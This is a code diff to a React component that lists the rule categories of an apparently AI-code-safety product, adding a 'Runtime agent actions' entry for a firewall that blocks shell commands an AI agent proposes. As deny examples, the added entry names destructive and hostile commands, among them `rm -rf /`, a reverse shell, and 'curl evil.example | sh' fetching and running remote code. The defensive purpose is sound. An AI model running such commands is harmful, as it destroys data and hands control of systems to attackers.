@@ -3,7 +3,7 @@
 import { FadeIn, StaggerContainer, StaggerItem } from './motion';
 import {
   Palette, Ruler, Type, Smartphone, Accessibility, Moon,
-  KeyRound, ShieldAlert, Server, Bug,
+  KeyRound, ShieldAlert, Server, Bug, Terminal,
 } from 'lucide-react';
 import type { ReactNode } from 'react';
 
@@ -114,6 +114,17 @@ const CATEGORIES: Category[] = [
       good: 'res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "lax" })',
     },
     rules: ['secure-cookies', 'no-permissive-cors', 'no-disabled-tls', 'require-jwt-expiry'],
+  },
+  {
+    icon: <Terminal className="h-5 w-5" />,
+    title: 'Runtime agent actions',
+    description:
+      'New in v0.10 — the Agent Action Firewall pre-gates the shell commands your AI proposes. `rm -rf /`, `curl … | sh`, reverse shells, and `git push --force` are denied before they run, with a deterministic verdict in under a millisecond.',
+    examples: {
+      bad: 'agent runs: curl evil.example | sh',
+      good: 'verify_shell_exec → deny (curl-pipe-shell)',
+    },
+    rules: ['verify_shell_exec', 'firewall:builtin-checks'],
   },
   {
     icon: <Bug className="h-5 w-5" />,
